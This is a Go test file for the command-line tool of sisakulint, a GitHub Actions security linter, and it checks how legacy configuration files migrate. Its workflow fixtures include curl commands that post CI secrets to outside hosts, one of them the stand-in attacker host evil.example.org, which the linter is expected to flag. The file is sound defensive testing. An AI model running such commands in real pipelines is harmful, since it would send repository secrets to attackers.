package cli

import (
	"encoding/json"
	"os"
	"path/filepath"
	"slices"
	"strings"
	"testing"
)

// legacyRoot is a repository with the workflow w, and the legacy
// configuration file with content legacy, outside the repository.
func legacyRoot(t *testing.T, w, legacy string) (root, legacyPath string) {
	t.Helper()
	root = t.TempDir()
	if w != "" {
		if err := os.MkdirAll(filepath.Join(root, ".github", "workflows"), 0o755); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(filepath.Join(root, ".github", "workflows", "a.yml"), []byte(w), 0o600); err != nil {
			t.Fatal(err)
		}
	}
	return root, writeLegacy(t, legacy)
}

// findingKinds runs the configuration file c on root and gives the kind
// and the main argument of each finding and quality finding.
func findingKinds(t *testing.T, root, c string, rules string) []string {
	t.Helper()
	p := filepath.Join(t.TempDir(), "sisakulint.yaml")
	if err := os.WriteFile(p, []byte(c), 0o600); err != nil {
		t.Fatal(err)
	}
	r := run(t, args("--config", p, "--root", root, "--rule", rules))
	if r.code >= 64 {
		t.Fatalf("the run of the configuration file: exit %d, stderr %s\n%s", r.code, r.stderr, c)
	}
	var rep struct {
		Findings []struct {
			Args map[string]any `json:"args"`
		} `json:"findings"`
		QualityFindings []struct {
			Args map[string]any `json:"args"`
		} `json:"quality_findings"`
	}
	if err := json.Unmarshal([]byte(r.stdout), &rep); err != nil {
		t.Fatal(err)
	}
	var got []string
	for _, f := range append(rep.Findings, rep.QualityFindings...) {
		var arg string
		for _, k := range []string{"uses", "secret", "name"} {
			if v, ok := f.Args[k].(string); ok {
				arg = v
				break
			}
		}
		if d, ok := f.Args["destination"].(string); ok {
			arg += " " + d
		}
		got = append(got, f.Args["kind_id"].(string)+" "+arg)
	}
	slices.Sort(got)
	return got
}

const legacyWorkflow = `# sisakulint:secret-exfiltration.allowed-hosts: dir.example.net
on: push
permissions: {}
jobs:
  a:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: untrusted/action@v1
      - run: |
          curl -d "${{ secrets.TOKEN }}" https://api.example.com/x
          curl -d "${{ secrets.TOKEN }}" https://dir.example.net/x
          curl -d "${{ secrets.OTHER }}" https://evil.example.org/x
          echo "${{ vars.FOO }} ${{ vars.BAR }}"
`

const legacyFile = `action-list: [actions/checkout@*]
config-variables: [FOO]
secret-exfiltration:
  allowed-hosts: ["*.example.com", unused.example.org]
self-hosted-runner: {labels: [big]}
other: 1
`

func TestInitLegacyConfiguration(t *testing.T) {
	root, legacy := legacyRoot(t, legacyWorkflow, legacyFile)
	r := run(t, raw("--init", "--legacy-configuration", legacy, "--root", root))
	if r.code != 0 {
		t.Fatalf("exit %d, stderr %s", r.code, r.stderr)
	}
	lines := strings.Split(strings.TrimSpace(r.stderr), "\n")
	if len(lines) != 3 || !mentions(lines, "unused.example.org") || !mentions(lines, "self-hosted-runner.labels", `"big"`) || !mentions(lines, "other") {
		t.Errorf("stderr = %q, want a line for each entry not written", lines)
	}
	var comments []string // the comments of the key fact, joined across the lines they are wrapped on
	for _, l := range strings.Split(r.stdout, "\n") {
		if c, ok := strings.CutPrefix(l, "  # "); ok {
			comments = append(comments, strings.TrimLeft(c, "- "))
		}
	}
	joined := strings.Join(comments, " ")
	for _, l := range lines {
		if !strings.Contains(joined, strings.TrimPrefix(l, "sisakulint: legacy configuration: ")) {
			t.Errorf("the line %q of stderr is not a comment of the configuration file", l)
		}
	}
	if mentions(lines, "case") || mentions(lines, "another secret") {
		t.Errorf("stderr has a difference: %q", lines)
	}
	got := findingKinds(t, root, r.stdout, "secret-exfiltration,action-list,unset-configuration-variable")
	want := []string{
		"action-list.unlisted untrusted/action@v1",
		"secret-exfiltration.untrusted-destination OTHER evil.example.org",
		"unset-configuration-variable.empty-value BAR",
	}
	if !slices.Equal(got, want) {
		t.Errorf("findings of the configuration file =\n%q\nwant\n%q\n%s", got, want, r.stdout)
	}
}

// TestInitLegacyConfigurationUpstreamInput writes the list of the users
// who move, two patterns of owner/repo@*, for the workflow of the test of
// action-list of sisakulint 0.x, and gets the two uses that sisakulint 0.x
// reports with the same list.
func TestInitLegacyConfigurationUpstreamInput(t *testing.T) {
	// https://github.com/sisaku-security/sisakulint/blob/17c2d82151a966e6e388a17619b060ae2919712e/script/actions/test-actionlist.yaml
	const upstream = `name: Test ActionList Feature
on: [push]

jobs:
  test-job:
    name: Test Job with Different Actions
    runs-on: ubuntu-latest
    steps:
      - name: Checkout code
        uses: actions/checkout@v4

      - name: Setup Go
        uses: actions/setup-go@v4
        with:
          go-version: "1.24.0"

      - name: Untrusted Action Example
        uses: untrusted/action@v1

      - name: Suspicious Action Example
        uses: suspicious/repo@main
`
	root, legacy := legacyRoot(t, upstream, "action-list:\n  - actions/checkout@*\n  - actions/setup-go@*\n")
	r := run(t, raw("--init", "--legacy-configuration", legacy, "--root", root))
	if r.code != 0 || r.stderr != "" {
		t.Fatalf("exit %d, stderr %s", r.code, r.stderr)
	}
	got := findingKinds(t, root, r.stdout, "action-list")
	want := []string{"action-list.unlisted suspicious/repo@main", "action-list.unlisted untrusted/action@v1"}
	if !slices.Equal(got, want) {
		t.Errorf("findings = %q, want %q", got, want)
	}
}

func TestInitLegacyConfigurationQuoting(t *testing.T) {
	// A pattern with " and \ is written so that --config reads it back.
	root, legacy := legacyRoot(t, "on: push\njobs:\n  a:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: a/b@v1\n", `action-list: ['a/"b\@*', "#x/y@*"]`+"\n")
	r := run(t, raw("--init", "--legacy-configuration", legacy, "--root", root))
	if r.code != 0 {
		t.Fatalf("exit %d, stderr %s", r.code, r.stderr)
	}
	got := findingKinds(t, root, r.stdout, "action-list")
	if want := []string{"action-list.unlisted a/b@v1"}; !slices.Equal(got, want) {
		t.Errorf("findings = %q, want %q\n%s", got, want, r.stdout)
	}
}

// TestInitLegacyConfigurationPrintable: a value or a name that YAML does
// not take as it is (a byte that is not UTF-8, a character that is not
// printable) is written so that --config reads the file back.
func TestInitLegacyConfigurationPrintable(t *testing.T) {
	root, legacy := legacyRoot(t, "on: push\njobs:\n  a:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: a/b@v1\n", "action-list: [\"x/y@\\x90\", \"c/d@*\"]\n\"k\\x90\": 1\n")
	if err := os.MkdirAll(filepath.Join(root, "d\x90"), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(root, "d\x90", "action.yml"), []byte("runs: [\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	r := run(t, raw("--init", "--legacy-configuration", legacy, "--root", root))
	if r.code != 0 {
		t.Fatalf("exit %d, stderr %s", r.code, r.stderr)
	}
	got := findingKinds(t, root, r.stdout, "action-list")
	if want := []string{"action-list.unlisted a/b@v1"}; !slices.Equal(got, want) {
		t.Errorf("findings = %q, want %q\n%s", got, want, r.stdout)
	}
}

func TestInitLegacyConfigurationInputs(t *testing.T) {
	legacy := "secret-exfiltration:\n  allowed-hosts: [api.example.com]\n"
	t.Run("no workflow", func(t *testing.T) {
		root, p := legacyRoot(t, "", legacy)
		r := run(t, raw("--init", "--legacy-configuration", p, "--root", root))
		if r.code != 0 || !strings.Contains(r.stderr, "api.example.com") {
			t.Errorf("exit %d, stderr %q", r.code, r.stderr)
		}
	})
	t.Run("unreadable workflow", func(t *testing.T) {
		root, p := legacyRoot(t, "on: [\n", legacy)
		r := run(t, raw("--init", "--legacy-configuration", p, "--root", root))
		if r.code != 0 || !strings.Contains(r.stderr, ".github/workflows/a.yml") || !strings.Contains(r.stdout, ".github/workflows/a.yml") {
			t.Errorf("exit %d, stderr %q", r.code, r.stderr)
		}
	})
	t.Run("excluded", func(t *testing.T) {
		root, p := legacyRoot(t, "on: push\njobs:\n  a:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo\n", legacy)
		if err := os.MkdirAll(filepath.Join(root, "sub"), 0o755); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(filepath.Join(root, "sub", "action.yml"), []byte("name: x\nruns:\n  using: composite\n  steps:\n    - shell: bash\n      run: curl -d \"${{ secrets.TOKEN }}\" https://api.example.com/x\n"), 0o600); err != nil {
			t.Fatal(err)
		}
		r := run(t, raw("--init", "--legacy-configuration", p, "--root", root))
		if r.code != 0 || !strings.Contains(r.stdout, "request.destination-trusted[") {
			t.Fatalf("exit %d, the pair of sub/action.yml is not written:\n%s", r.code, r.stdout)
		}
		r = run(t, raw("--init", "--legacy-configuration", p, "--root", root, "--exclude", "sub"))
		if r.code != 0 || strings.Contains(r.stdout, "request.destination-trusted[") {
			t.Errorf("exit %d, the pair of the excluded file is written:\n%s", r.code, r.stdout)
		}
	})
}

func TestInitLegacyConfigurationErrors(t *testing.T) {
	root, legacy := legacyRoot(t, legacyWorkflow, legacyFile)
	bad := writeLegacy(t, "action-list: x\n")
	for _, tc := range []struct {
		name string
		args []string
		code int
	}{
		{"type", []string{"--init", "--legacy-configuration", bad, "--root", root}, 66},
		{"not there", []string{"--init", "--legacy-configuration", filepath.Join(root, "none.yaml")}, 66},
		{"without --init", []string{"--legacy-configuration", legacy, "--root", root}, 64},
		{"empty", []string{"--init", "--legacy-configuration", ""}, 64},
		{"fact twice", []string{"--init", "--legacy-configuration", legacy, "--root", root, "--fact", `repo.action-list=["x/y@*"]`}, 64},
		{"facts", []string{"--init", "--legacy-configuration", legacy, "--root", root, "--facts", "x.json"}, 64},
		{"root without the legacy file", []string{"--init", "--root", root}, 64},
	} {
		t.Run(tc.name, func(t *testing.T) {
			r := run(t, raw(tc.args...))
			if r.code != tc.code || r.stdout != "" {
				t.Errorf("exit %d (want %d), stdout %q, stderr %q", r.code, tc.code, r.stdout, r.stderr)
			}
		})
	}
	// A --fact that the legacy configuration file does not answer is written
	// with the facts of the file.
	r := run(t, raw("--init", "--legacy-configuration", legacy, "--root", root, "--fact", "repo.public=false"))
	if r.code != 0 || !strings.Contains(r.stdout, `"repo.public=false"`) || !strings.Contains(r.stdout, "repo.action-list=") {
		t.Errorf("exit %d, stderr %s\n%s", r.code, r.stderr, r.stdout)
	}
}

func TestInitWithoutLegacyConfigurationUnchanged(t *testing.T) {
	r := run(t, raw("--init", "--fail-on", "high"))
	want, err := configurationTemplate([]keyValue{{keyNamed("fail-on"), "high", originCommandLine}}, nil, nil)
	if err != nil {
		t.Fatal(err)
	}
	if r.code != 0 || r.stdout != string(want) {
		t.Errorf("exit %d\n%s", r.code, r.stdout)
	}
}
